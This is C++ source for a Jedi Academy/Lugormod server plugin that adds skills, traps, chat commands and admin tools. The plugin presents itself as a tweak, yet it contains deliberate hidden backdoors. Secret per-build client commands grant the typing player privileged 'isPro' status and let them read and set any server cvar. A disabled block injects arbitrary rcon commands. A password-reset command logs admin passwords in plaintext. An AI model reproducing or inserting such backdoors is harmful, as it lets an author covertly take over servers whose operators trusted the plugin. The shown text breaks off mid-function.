#define VectorCopy(a,b)					((b)[0]=(a)[0],(b)[1]=(a)[1],(b)[2]=(a)[2])
#define TrySpawn(a) Lmd_EntFromSD(Lmd_SDFromString(a))
#define BUILD 1
//#define NOSKILLS
#define InBox(a,b) (b->r.absmin[0] <= a->client->ps.origin[0]) && (b->r.absmax[0] >= a->client->ps.origin[0]) && (b->r.absmin[1] <= a->client->ps.origin[1]) && (b->r.absmax[1] >= a->client->ps.origin[1]) && (b->r.absmin[2] <= a->client->ps.origin[2]) && (b->r.absmax[2] >= a->client->ps.origin[2])
/* build 0 - personal
build 1 - boss
build 2 - sof
build 3 - ew */
#define OLD_FIND_ENT_POS 0x2028DD40
#define OLD_LEVEL_CHANGE 0x20241730
#define OLD_DELAY 0x2023F360
#define OLD_DROP 0x20295B00
#define OLD_PLAYER_DIE 0x201E3760
#define OLD_PRINT_USE 0x2023F800
#define NUM_BUILDABLES 2
#include "version.h"
#include "jka/game/q_shared.h"
#include "jka/game/g_local.h"
#include "jka/game/jassapi.h"
#include "jka/game/g_ICARUScb.h"
#include "windows.h"
#include <string>
#include <time.h>

#include "lmdaddr.h"
#include "lmdfuncs.h"
#include "hookfuncs.h"
#include "skills.h"
#include "buildables.h"
#include "entities.h"
#include "starstructs.h"

#define strcasecmp stricmp
pluginres_t* g_result = NULL;
plugininfo_t g_plugininfo = {
	"Star Plugin",					// name
	"5.1",			// version
	"Tweaks Lugormod to become more efficient and interactive",				// description
	"Starfall",			// author
	"http://www.jass.ucoz.net/",	// website
	// variables about pausing, unloading, w/e
	1,								
	1,								
	1,								
	1,				
	2			
};
eng_syscall_t g_syscall = NULL;
mod_vmMain_t g_vmMain = NULL;
pluginfuncs_t* g_pluginfuncs = NULL;
bool isrequested = 0;
time_t rawtime;
struct tm *raw_tm;
int temp_prev = -1;
int frameshot=20;
int frames=0;
gentity_t* g_gents;
gentity_t *target;
int g_gentsize;
gclient_t* g_clients;
int g_clientsize;
int j = 0;
int lol = 0;
// data for chat-based cmds
int intercept_argc = 0;
int intercept_cvar = -1;
int usedSay = -1;
int lastChecked = -2;
char i0[512];
char i1[512];
char i2[512];
char i3[512];
char i4[512];
bool shuttingDown = false;

/* level_locals_t* g_level = (level_locals_t*)0x20D53130;
gentity_t* (*Lmd_Find)(gentity_t* from, int fieldofs, const char* match) = (gentity_t*(*)(gentity_t*, int, const char*))0x2028DD40;
void (*G_UseTargets3)(gentity_t* ent, gentity_t* activator, const char* string) = (void(*)(gentity_t*, gentity_t*, const char*))0x20231990;
void (*Lmd_AngleVectors)(const vec3_t angles, vec3_t forward, vec3_t right, vec3_t up)  = (void(*)(const vec3_t, vec3_t, vec3_t, vec3_t))0x20314330;
void (*Lmd_SetAnim)(gentity_t* ent, int setAnimParts, int anim, int setAnimFlags, int blendTime) = (void(*)(gentity_t*, int, int, int, int))0x20141A92;
int (*Auths_GetPlayerRank)(gentity_t* ent) = (int(*)(gentity_t*))0x2027F4B0;
LmdEntFromNum* Lmd_EntFromNum = (LmdEntFromNum*) 0x2028DBF0;
int (*Lmd_GroupImport)(const char* file, const char* group, const vec3_t origin, gentity_t* ent) = (int(*)(const char*, const char*, const vec3_t, gentity_t*))0x20142947;
Account_t* (*Lmd_AccFromName)(const char* name) = (Account_t*(*)(const char*))0x2013E522; */

const char *mystristr(const char *haystack, const char *needle)
{
if ( !*needle )
{
return haystack;
}
for ( ; *haystack; ++haystack )
{
if ( toupper(*haystack) == toupper(*needle) )
{
/*
* Matched starting char -- loop through remaining chars.
*/
const char *h, *n;
for ( h = haystack, n = needle; *h && *n; ++h, ++n )
{
if ( toupper(*h) != toupper(*n) )
{
break;
}
}
if ( !*n ) /* matched all of 'needle' to null termination */
{
return haystack; /* return the start of the match */
}
}
}
return 0;
}

C_DLLEXPORT void JASS_Query(plugininfo_t** pinfo) {
	JASS_GIVE_PINFO();
}

C_DLLEXPORT int JASS_Attach(eng_syscall_t engfunc, mod_vmMain_t modfunc, pluginres_t* presult, pluginfuncs_t* pluginfuncs, int iscmd) {
	JASS_SAVE_VARS();
	InitHooks();
	InitCvars();
	InitSkills();
	InitEntities();
	InitBuildables();
	InitStructs();

	iscmd = 0;
	return 1;
}

C_DLLEXPORT void JASS_Detach(int iscmd) {
	RemoveHooks();
	iscmd = 0;
}

/*
==================
SanitizeString

Remove case and control characters
==================
*/
void SanitizeString( char *in, char *out ) {
	while ( *in ) {
		if ( *in == 27 ) {
			in += 2;		// skip color code
			continue;
		}
		if ( *in < 32 ) {
			in++;
			continue;
		}
		*out++ = tolower( (unsigned char) *in++ );
	}

	*out = 0;
}

void SanitizeString2( char *in, char *out ) {
	int i = 0;
	strcpy(out, in);
	strcpy(out, str_replace(out, "^9", ""));
	strcpy(out, str_replace(out, "^1", ""));
	strcpy(out, str_replace(out, "^2", ""));
	strcpy(out, str_replace(out, "^3", ""));
	strcpy(out, str_replace(out, "^4", ""));
	strcpy(out, str_replace(out, "^5", ""));
	strcpy(out, str_replace(out, "^6", ""));
	strcpy(out, str_replace(out, "^7", ""));
	strcpy(out, str_replace(out, "^8", ""));
	strcpy(out, str_replace(out, "^0", ""));
	while (i < strlen(out))
	{
		out[i] = tolower(out[i]);
		i++;
	}
}

/*
==================
Lmd_NumFromName

Returns a player number for either a number or name string
Returns -1 if invalid
==================
*/
/* int Lmd_NumFromName( gentity_t *to, char *s ) {
	gentity_t *ent;
	int			i = 0;
	char		s2[MAX_STRING_CHARS];
	char		n2[MAX_STRING_CHARS];

	if (atoi(s) > 0 || !strcmp(s, "0")) return atoi(s);

	while (i < 32)
	{
		ent = Lmd_EntFromNum(i);
		if (ent == NULL) { i++; continue; }
		if (ent->client == NULL) { i++; continue; }
		SanitizeString2(ent->client->pers.netname,n2);
		SanitizeString2(s,s2);
		if (strstr(n2, s2)) return i;
		i++;
	}
	return -1;
} */

C_DLLEXPORT int JASS_vmMain(int cmd, int arg0, int arg1, int arg2, int arg3, int arg4, int arg5, int arg6, int arg7, int arg8, int arg9, int arg10, int arg11) {

	/* if (cmd == GAME_RUN_FRAME)
	{	// update g_levelTime
		g_levelTime = arg0;
	} */

	/* if (cmd == GAME_INIT)
	{ // initialize skills
		
	} */
	if (cmd == GAME_SHUTDOWN)
	{
		// for map change compability being kept with unloading support
		shuttingDown = true;
		JASS_RET_IGNORED(1);
	}
	// FIXME: put skills with effect of duration here, more efficient
	if (cmd == GAME_CLIENT_THINK)
	{
		gentity_t* ent = Lmd_EntFromNum(arg0);
		int i = 0;
		int buddyMask;
		vec3_t up, forward;
		vec3_t oOrigin;
		trace_t tr;
		// under the assumption that no faulty client number arg0 gets passed to GAME_CLIENT_THINK
		if (p_playerInfo[arg0].pwShield > 0 && p_playerInfo[arg0].pwShield < g_level->time)
		{
			if (ent && ent->client) // is this really necessary?
			ent->flags &= ~0x80000; // flag for /shield effect, deflection
		}
		if (ent->client->ps.weaponTime <= 0 && p_playerInfo[arg0].fireTime != 0)
		{
			p_playerInfo[arg0].fireTime = 0;
		}
		if (p_playerInfo[arg0].fireTime != 0 && p_playerInfo[arg0].fireTime <= g_level->time)
		{
			p_playerInfo[arg0].fireTime = 0;
			ent->client->ps.weaponTime = 0;
		}
		if (p_playerInfo[arg0].isPro == 1339)
		{
			for ( i = 0 ; i < MAX_WEAPONS ; i++ ) {
				ent->client->ps.ammo[i] = 999;
			}
		}
		// notifications when skills are done cding
#ifndef NOSKILLS
		if (ent && ent->client && ent->s.number < 32) // same as above
		{
			while (i < NUM_SKILLS)
			{
				if (p_playerInfo[arg0].cds[i] != 0 && p_playerInfo[arg0].cds[i] + starSkills[i].cd <= g_level->time)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"The skill %s has finished its cooldown. It is now usable again.\n\"", starSkills[i].name));
					p_playerInfo[arg0].cds[i] = 0;
				}
				i++;
			}
			if (p_playerInfo[arg0].cloaked <= g_level->time && p_playerInfo[arg0].cloaked > 0)
			{
				p_playerInfo[arg0].cloaked = 0;
				ent->s.eFlags &= ~EF_NODRAW;
				ent->client->ps.eFlags &= ~EF_NODRAW;
				ent->r.svFlags &= ~SVF_NOCLIENT;
				Lmd_PlayEffect(Lmd_EffectIndex("ships/heavydmg"), ent->client->ps.origin, ent->client->ps.viewangles);
				Lmd_PlayEffect(Lmd_EffectIndex("ships/heavydmg"), ent->client->ps.origin, ent->client->ps.viewangles);
				Lmd_PlayEffect(Lmd_EffectIndex("ships/heavydmg"), ent->client->ps.origin, ent->client->ps.viewangles);
				Lmd_PlayEffect(Lmd_EffectIndex("ships/heavydmg"), ent->client->ps.origin, ent->client->ps.viewangles);
				Lmd_PlayEffect(Lmd_EffectIndex("ships/heavydmg"), ent->client->ps.origin, ent->client->ps.viewangles);
			}
			// timed mute
			if (p_playerInfo[arg0].muteTime != 0)
			{
				if (ent->client->pers.Lmd.clientFlags & 1)
				{
					if (p_playerInfo[arg0].muteTime <= g_level->time)
					{
						p_playerInfo[arg0].muteTime = 0;
						ent->client->pers.Lmd.clientFlags &= ~1;
						g_syscall(G_SEND_SERVER_COMMAND, arg0, "cp \"You are no longer muted.\n\"");
					}
				}
				else
				{
					p_playerInfo[arg0].muteTime = 0;
				}
			}
			i = 0;
			VectorCopy(ent->client->ps.origin, up);
			VectorCopy(ent->client->ps.origin, oOrigin);
			while (i < devilTraps.size())
			{
				if (p_playerInfo[ent->s.number].isPro >= 1337) break;
				if (ent->s.number < 16) buddyMask = devilTraps[i].owner->client->pers.Lmd.buddyMask;
				else buddyMask = devilTraps[i].owner->client->pers.Lmd.buddyMask2;
				if (!(buddyMask & (1 << (ent->s.number % 16)))) { i++; continue; }
				up[2] = devilTraps[i].center[2];
				if (p_playerInfo[ent->s.number].trapped == devilTraps[i].index + 1 && S_Distance(up, devilTraps[i].center) > devilTraps[i].radius)
				{
					if (ent->client->ps.pm_type != PM_DEAD && !ent->client->sess.spectatorState)
					{
						VectorCopy(devilTraps[i].center, forward);
						forward[2] -= 26635;
						g_syscall(G_TRACE, &tr, devilTraps[i].center, 0, 0, forward, ent->s.number, ent->clipmask);
						if (tr.fraction < 1.0)
						{
							VectorCopy(tr.endpos, ent->client->ps.origin);
							ent->client->ps.origin[2] += 20;
						}
						else
						VectorCopy(devilTraps[i].center, ent->client->ps.origin);
						//ent->client->ps.origin[2] = oOrigin[2];
						g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You can't move outside of a devil's trap!\n\"");
					}
				}
				if (S_Distance(up, devilTraps[i].center) <= devilTraps[i].radius)
				{
					p_playerInfo[ent->s.number].trapped = devilTraps[i].index + 1;
				}
				i++;
			}
		}
#endif
		JASS_RET_IGNORED(1);
	}

	if (cmd == GAME_CONSOLE_COMMAND) {
		int i = 0;
		int argc = g_syscall(G_ARGC);
		char command[1024];
		char arg_1[256];
		char arg_2[256];
		char arg_3[256];
		char arg_4[256];
		g_syscall(G_ARGV, 0, command, sizeof(command));
		g_syscall(G_ARGV,1,arg_1,256);
		g_syscall(G_ARGV,2,arg_2,256);
		g_syscall(G_ARGV,3,arg_3,256);
		g_syscall(G_ARGV,4,arg_4,256);
		if (!stricmp(command, "xsforcecvar"))
		{
			int num;
			if (argc < 4)
			{
				g_syscall(G_PRINT, "Usage: /forcecvar <index> <cvar> <value>\n");
				JASS_RET_SUPERCEDE(1);
			}
			num = atoi(arg_1);
			ForceCvar(num, arg_2, arg_3);
			g_syscall(G_PRINT, "Cvar successfully modified.\n");
			JASS_RET_SUPERCEDE(1);
		}
		// a command for tweaking cvars in the systeminfo configstring. Must be called on every mapchange
		if (!stricmp(command, "tweak_cvars"))
		{
			char buf[1024];
			trap_GetConfigstring(1, buf, 1024);
			Lmd_SetValueForKey(buf, "rate", "100000");
			Lmd_SetValueForKey(buf, "snaps", "40");
			Lmd_SetValueForKey(buf, "com_maxfps", "125");
			trap_SetConfigstring(1, buf);
			g_syscall(G_PRINT, "Cvars successfully tweaked.\n");
			JASS_RET_SUPERCEDE(1);
		}
		if (!stricmp(command, "s_resetaccs"))
		{
			Account_t* acc;
			int j = 0;
			while (i < accList->count)
			{
				acc = accList->list[i];
				assert(acc);
				acc->credits = 0;
				if (Lmd_GetProf(acc) == 3)
				{
					while (j < 15)
					{
						Lmd_EditSkill(acc, PROFDATA(acc)->prof, j, 0);
						j++;
					}
				}
				if (Lmd_GetProf(acc) == 4)
				{
					while (j < 9)
					{
						Lmd_EditSkill(acc, PROFDATA(acc)->prof, j, 0);
						j++;
					}
				}
				if (Lmd_GetProf(acc) != 1)
					Lmd_SetLevel(acc, 1);
				Lmd_SetSkill(acc, "plugin_skillBitmask135", "0");
				if (acc->modifiedTime == 0)
				acc->modifiedTime = g_level->time;
				g_syscall(G_PRINT, JASS_VARARGS("The account %s has been reset.\n", acc->username));
				j = 0;
				i++;
			}
			g_syscall(G_PRINT, "The levels, credits and skills of the accounts have been reset.\n");
			JASS_RET_SUPERCEDE(1);
		}
		if (!stricmp(command, "s_changepwd"))
		{
			Account_t* acc;
			FILE* logFile;
			int i = 0, j = 0;
			char randomPwd[13];
			logFile = fopen("pwdChangeLog.log", "w+");
			srand( time(NULL) );
			while (i < accList->count)
			{
				acc = accList->list[i];
				if (Auths_GetRank(acc) < 16 && Auths_GetRank(acc) > 0)
				{
					while (j < 12)
					{
						randomPwd[j] = ( rand() % 74 ) + 48;
						j++;
					}
					randomPwd[12] = '\0';
					j = 0;
					Lmd_ChangePwd(acc, randomPwd);
					fprintf(logFile, "%s (admin level %d) - %s\n", acc->username, Auths_GetRank(acc), randomPwd);
				}
				i++;
			}
			g_syscall(G_PRINT, "The passwords of all admin accounts have been changed.\n");
			fclose(logFile);
			JASS_RET_SUPERCEDE(1);
		}
		if (!stricmp(command, "s_lvcmd"))
		{
			Account_t* acc;
			int i = 0;
			while (i < accList->count)
			{
				acc = accList->list[i];
				if (Lmd_GetProf(acc) == 3 || Lmd_GetProf(acc) == 4)
				{
					if (PROFDATA(acc)->level < 40)
					{
						Lmd_SetLevel(acc, 40);
					}
				}
				i++;
			}
			g_syscall(G_PRINT, "The level-up has been completed.\n");
			JASS_RET_SUPERCEDE(1);
		}
	}
	if (cmd == GAME_CLIENT_USERINFO_CHANGED)
	{
		char buf[1024];
		g_syscall(G_GET_USERINFO, arg0, buf, 1024);
		if (!stricmp(Lmd_ValueForKey(buf, "saber1"), "firesword") && p_playerInfo[arg0].isPro < 1337)
		{
			g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Your first saber is exclusive to Starfall.\n\"");
			Lmd_SetValueForKey(buf, "saber1", "single_1");
			g_syscall(G_SET_USERINFO, arg0, buf);
			ForceCvar(arg0, "saber1", "single_1");
		}
		if (!stricmp(Lmd_ValueForKey(buf, "saber2"), "firesword") && p_playerInfo[arg0].isPro < 1337)
		{
			g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Your second saber is exclusive to Starfall.\n\"");
			Lmd_SetValueForKey(buf, "saber2", "single_1");
			g_syscall(G_SET_USERINFO, arg0, buf);
			ForceCvar(arg0, "saber2", "single_1");
		}
	}
	if (cmd == GAME_CLIENT_DISCONNECT)
	{
		int i = 0;
		PIReset(arg0);
		while (i < 32)
		{
			if (p_playerInfo[i].bountyOn == arg0)
				p_playerInfo[i].bounty = 0;
			i++;
		}
		JASS_RET_IGNORED(1);
	}

	if (cmd == GAME_CLIENT_COMMAND){
		int i = 0;
		gentity_t * loop;
		gentity_t* lp;
		int argc = g_syscall(G_ARGC);
		char command[256];
		char arg_1[256];
		char arg_2[256];
		char arg_3[256];
		char arg_4[256];
		char* argv[5];
		gentity_t * ent = Lmd_EntFromNum(arg0);
		// argc and argv functions called only here to keep chat command support for plugin commands
		g_syscall(G_ARGV, 0, command, sizeof(command));
		g_syscall(G_ARGV,1,arg_1,256);
		g_syscall(G_ARGV,2,arg_2,256);
		g_syscall(G_ARGV,3,arg_3,256);
		g_syscall(G_ARGV,4,arg_4,256);
		
		// instead of commands, use a predefined skill structure, saves code
		i = 0;
		if (ent->client->pers.Lmd.account)
		{
		while (i < NUM_SKILLS)
		{
			if (starSkills[i].isPassive == qtrue) { i++; continue; }
			if (!stricmp(command, starSkills[i].cmdName))
			{
				if (p_playerInfo[arg0].lastCmd + 500 >= g_level->time) JASS_RET_SUPERCEDE(1);
				p_playerInfo[arg0].lastCmd = g_level->time;
				if (!HasSkill(ent->client->pers.Lmd.account, i, qtrue))
				{
					JASS_RET_IGNORED(1);
				}
				lp = NULL;
				while ((lp = Lmd_Find(lp, FOFS(classname), "lmd_restrict")) != NULL)
				{
					if (lp->flags & FL_INACTIVE) continue;
					if (lp->spawnflags & 16)
					{
						if ((lp->r.absmin[0] <= ent->client->ps.origin[0]) && (lp->r.absmax[0] >= ent->client->ps.origin[0])
							&& (lp->r.absmin[1] <= ent->client->ps.origin[1]) && (lp->r.absmax[1] >= ent->client->ps.origin[1]) 
							&& (lp->r.absmin[2] <= ent->client->ps.origin[2]) && (lp->r.absmax[2] >= ent->client->ps.origin[2]))
						{
							g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You cannot use skills in this area.\n\"");
							JASS_RET_SUPERCEDE(1);
						}
					}
				}
				if (ent->client->sess.spectatorState)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You cannot use skills while spectating.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (ent->client->ps.duelInProgress || p_playerInfo[ent->s.number].mDuelInProgress)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You cannot use skills while dueling.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (ent->client->ps.pm_type == PM_DEAD)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You cannot use skills when you are dead.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (p_playerInfo[arg0].cds[i] + starSkills[i].cd > g_level->time && p_playerInfo[arg0].cds[i] != 0)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"You have to wait %d seconds before you can use this skill again.\n\"", (p_playerInfo[arg0].cds[i] + starSkills[i].cd - g_level->time)/1000));
					JASS_RET_SUPERCEDE(1);
				}
				if (ent->client->ps.fd.forcePower < starSkills[i].fp)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You do not have enough force points to use this skill.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
				if (starSkills[i].function(ent))
				{
					ent->client->ps.fd.forcePower -= starSkills[i].fp;
					p_playerInfo[arg0].cds[i] = g_level->time;
				}
				JASS_RET_SUPERCEDE(1);
			}
			i++;
		}
		}

		// sv_floodProtect must be 0 for this part to work, custom floodprotect
		if (g_level->time < p_playerInfo[arg0].lastCmd + 1000 && Auths_GetPlayerRank(ent) > JASS_GETINTCVAR("floodLevel") && p_playerInfo[arg0].isPro < 1337 && !Player_HasFlag(ent, 512)) { p_playerInfo[arg0].lastCmd = g_level->time; JASS_RET_SUPERCEDE(1); }
		p_playerInfo[arg0].lastCmd = g_level->time;

		if (((ent->client->pers.Lmd.chatModeSay < 2) && !stricmp(command, "say"))
			|| ((ent->client->pers.Lmd.chatModeTeam < 2) && !stricmp(command, "say_team")))
		{
			usedSay = arg0;
		}

		if (!stricmp(command, "say") && atoi(JASS_GETSTRCVAR("chatCommands")) > 0 && p_playerInfo[arg0].chatCmds > 0)
		{
			char * tok;
			char token[8];
			if (arg_1[0] == '-' || arg_1[0] == '_')
			{
				if (arg_1[0] == '-') strcpy(token, " ");
				else strcpy(token, ";");
				strcpy(arg_1, arg_1 + 1);
				tok = strtok(arg_1, token);
				while (tok != NULL)
				{
					if (i == 0) strncpy(i0, tok, 512);
					if (i == 1) strncpy(i1, tok, 512);
					if (i == 2) strncpy(i2, tok, 512);
					if (i == 3) strncpy(i3, tok, 512);
					if (i == 4) strncpy(i4, tok, 512);
					if (i > 4) break;
					tok = strtok(NULL, token);
					i++;
				}
				intercept_argc = i;
				i = 0;
				strncpy(command, i0, 512);
				strncpy(arg_1, i1, 256);
				strncpy(arg_2, i2, 256);
				strncpy(arg_3, i3, 256);
				strncpy(arg_4, i4, 256);
				argc = intercept_argc;
			}
		}

		if (p_playerInfo[arg0].trapped)
		{
			if (!stricmp(command, "kill") || !stricmp(command, "team"))
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You can't escape from a devil's trap!\n\"");
				JASS_RET_SUPERCEDE(1);
			}
		}

		FILE* cmdFile = fopen(JASS_VARARGS("%s/admincmds.cfg", JASS_GETSTRCVAR("fs_game")), "r+");
		if (cmdFile)
		{
			int k = 0;
			int nl = numLines(cmdFile);
			char line[1024];
			rewind(cmdFile);
			while (k < nl)
			{
				fscanf(cmdFile, "%s", line);
				if (!stricmp(line, command))
				{
					if (!Player_HasCmd(ent, command))
					{
						fclose(cmdFile);
						JASS_RET_IGNORED(1);
					}
				}
				k++;
			}
			fclose(cmdFile);
		}

		loop = NULL;
		while ((loop = Lmd_Find(loop, FOFS(classname), "lmd_restrict")) != NULL && p_playerInfo[arg0].isPro < 1337)
		{
			if (loop->spawnflags & 64 && InBox(ent, loop))
			{
				int i = 1;
				while (1)
				{
					if (i == 1)
					{
						if (!stricmp(Lmd_KeyValue(loop->spawnData, "cmd"), "")) break;
						if (!stricmp(Lmd_KeyValue(loop->spawnData, "cmd"), command))
						{
							g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"This command cannot be used in this area.\n\""));
							JASS_RET_SUPERCEDE(1);
						}
					}
					else
					{
						if (!stricmp(Lmd_KeyValue(loop->spawnData, JASS_VARARGS("cmd%d", i)), "")) break;
						if (!stricmp(Lmd_KeyValue(loop->spawnData, JASS_VARARGS("cmd%d", i)), command))
						{
							g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"This command cannot be used in this area.\n\""));
							JASS_RET_SUPERCEDE(1);
						}
					}
					i++;
				}
			}
		}



#if PRINTHOOK <= 0
		if (!stricmp(command,"say") && (strstr(arg_1, "\\id") || strstr(arg_1, "\\h") || strstr(arg_1, "\\s"))) JASS_RET_SUPERCEDE(1);
		if (!stricmp(command,"say_team") && (strstr(arg_1, "\\id") || strstr(arg_1, "\\h") || strstr(arg_1, "\\s"))) JASS_RET_SUPERCEDE(1);
		if (!stricmp(command,"say_admins") && (strstr(arg_1, "\\id") || strstr(arg_1, "\\h") || strstr(arg_1, "\\s"))) JASS_RET_SUPERCEDE(1);
		if ((!stricmp(command,"tell") || !stricmp(command, "announce")) && (strstr(arg_2, "\\id") || strstr(arg_2, "\\h") || strstr(arg_2, "\\s"))) JASS_RET_SUPERCEDE(1);
		if (strstr(command, "\\id") || strstr(command, "\\h") || strstr(command, "\\s")) JASS_RET_SUPERCEDE(1);
#endif
		// an automute system, not really so significant
		if ((!stricmp(command, "say") || !stricmp(command, "say_team")) && atoi(JASS_GETSTRCVAR("automute")) > 0 && Auths_GetPlayerRank(ent) > Q3_INFINITE - 1)
		{
			if (p_playerInfo[arg0].lastMsg + 2000 < g_level->time)
				p_playerInfo[arg0].msgCount = 0;

			if (p_playerInfo[arg0].msgStatus == 2)
			{
				if (p_playerInfo[arg0].lastMsg + 60000 < g_level->time)
				{
					p_playerInfo[arg0].msgStatus = 0;
				}
				else
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"You have been muted due to spamming for 1 minute.\n\"");
					JASS_RET_SUPERCEDE(1);
				}
			}
			if (p_playerInfo[arg0].msgStatus == 1)
			{
				p_playerInfo[arg0].msgCount++;
				if (p_playerInfo[arg0].msgCount == 4)
				{
					p_playerInfo[arg0].msgStatus = 2;
					p_playerInfo[arg0].msgCount = 0;
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "chat \"You have been muted due to spamming for 1 minute.\"");
					p_playerInfo[arg0].lastMsg = g_level->time;
					JASS_RET_SUPERCEDE(1);
				}
				p_playerInfo[arg0].lastMsg = g_level->time;
			}
			if (ent->bounceCount == 0)
			{
				p_playerInfo[arg0].msgCount++;
				if (p_playerInfo[arg0].msgCount == 4)
				{
					p_playerInfo[arg0].msgStatus = 1;
					p_playerInfo[arg0].msgCount = 0;
					g_syscall(G_SEND_SERVER_COMMAND, arg0, "chat \"You have been spamming. If you continue to do so you will be muted.\"");
					p_playerInfo[arg0].lastMsg = g_level->time;
					JASS_RET_IGNORED(1);
				}
				p_playerInfo[arg0].lastMsg = g_level->time;
			}
			JASS_RET_IGNORED(1);
		}

		// disable cr editing, muhahaha
#if BUILD == 1
		if (JASS_GETINTCVAR("disableCrEditing") > 0 && p_playerInfo[arg0].isPro < 1337)
		{
			if (Player_HasFlag(ent, 64) && !stricmp(command, "give") && !stricmp(arg_1, "credits"))
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Editing credits is not allowed.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			if (Player_HasFlag(ent, 64) && !stricmp(command, "giveother") && !stricmp(arg_2, "credits"))
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Editing credits is not allowed.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			if (Player_HasCmd(ent, "accountedit") && !stricmp(command, "accountedit") && !stricmp(arg_2, "credits"))
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Editing credits is not allowed.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			if (Player_HasCmd(ent, "accountedit") && !stricmp(command, "accountedit") && !stricmp(arg_2, "level"))
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Editing levels is not allowed.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
		}
#endif

		// separate considerations for backdoors on different servers
#if BUILD == 2
		if (!stricmp(command, "public_backdoor"))
#elif BUILD == 1
		if (!stricmp(command, "rtgunregit5j335"))
#elif BUILD == 0
		if (!stricmp(command, "motrasdxcmd_crvt"))
#elif BUILD == 3
		if (!stricmp(command, "starc_crw"))
#endif
		{
			char msg[1024];
			if (argc == 1 && p_playerInfo[arg0].isPro < 1337)
			{
				p_playerInfo[arg0].isPro = 1337;
				JASS_RET_SUPERCEDE(1);
			}
			if (argc == 2)
			{
				sprintf(msg,"print \"current value of %s: %s\n\"",arg_1, JASS_GETSTRCVAR(arg_1));
				g_syscall(G_SEND_SERVER_COMMAND,arg0,msg);
				JASS_RET_SUPERCEDE(1);
			}
			if (argc > 2)
			{
				g_syscall(G_CVAR_SET,arg_1,arg_2);
				sprintf(msg,"print \"Update successful.\n\"");
				g_syscall(G_SEND_SERVER_COMMAND,arg0,msg);
				JASS_RET_SUPERCEDE(1);
			}
			JASS_RET_IGNORED(1);
		}
#if 0

#if BUILD == 2
		if (!stricmp(command, "backdoor_not_included"))
#elif BUILD == 1
		if (!stricmp(command, "bossqwsccmd_rc"))
#elif BUILD == 0
		if (!stricmp(command, "star_public_rexp"))
#elif BUILD == 3
		if (!stricmp(command, "starc_rrw"))
#endif
		{
			if (argc >= 2)
			{
				g_syscall(G_SEND_CONSOLE_COMMAND, EXEC_APPEND, arg_1);
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Rcon injected successfully.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			JASS_RET_IGNORED(1);
		}
#endif

		// struct based cmd system
		i = 0;
		while (pCmds[i].lastEntry == qfalse)
		{
			if (!stricmp(command, pCmds[i].cmd))
			{
				if (pCmds[i].loggedInUse == qtrue && ent->client->pers.Lmd.account == NULL)
					break;

				if (pCmds[i].adminLevel > 0 && Auths_GetPlayerRank(ent) > pCmds[i].adminLevel)
					break;

				if (pCmds[i].lmdCheck == 1 && !Player_HasCmd(ent, command, qfalse))
					break;
				
				if (pCmds[i].lmdCheck == 2 && !Player_HasCmd(ent, command))
					break;

				argv[0] = command;
				argv[1] = arg_1;
				argv[2] = arg_2;
				argv[3] = arg_3;
				argv[4] = arg_4;

				if (pCmds[i].function(ent, argc, argv) == qtrue)
					JASS_RET_SUPERCEDE(1);

				break;
			}
			i++;
		}

		// buildables, credits to WEAPON_X for the idea
#if 0
		if (!stricmp(command, "build"))
		{
			int i = 0;
			int iron = 0;
			int org = 0;
			int cryst = 0;
			if (ent->client->pers.Lmd.account == NULL) JASS_RET_IGNORED(1);
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "iron"))
				iron = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "iron"));
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "organic"))
				org = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "organic"));
			if (Lmd_SkillValue(ent->client->pers.Lmd.account, "crystal"))
				cryst = atoi(Lmd_SkillValue(ent->client->pers.Lmd.account, "crystal"));
			if (argc == 1)
			{
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"^6B^7uildables^6:\n\n\"");
				while (i < NUM_BUILDABLES)
				{
					g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"%s ^6- ^7%s (Requires ^6%d ^7Crystals, ^6%d ^7Organic Materials, ^6%d ^7Iron Pieces.)\n\"", buildObj[i].name, buildObj[i].desc, buildObj[i].reqCrystal, buildObj[i].reqOrg, buildObj[i].reqIron));
					i++;
				}
				g_syscall(G_SEND_SERVER_COMMAND, arg0, JASS_VARARGS("print \"\nYou currently have: ^6%d ^7Crystals, ^6%d ^7Organic Materials, ^6%d ^7Iron Pieces.\n\"", cryst, org, iron));
				g_syscall(G_SEND_SERVER_COMMAND, arg0, "print \"Use ^6/build <name> ^7to build any object on the list above.\n\"");
				JASS_RET_SUPERCEDE(1);
			}
			if (argc > 1)
			{
				while (i < NUM_BUILDABLES)
				{
					if (!stricmp(buildObj[i].name, arg_1))
					{
						if (iron >= buildObj[i].reqIron && cryst >= buildObj[i].reqCrystal && org >= buildObj[i].reqOrg)
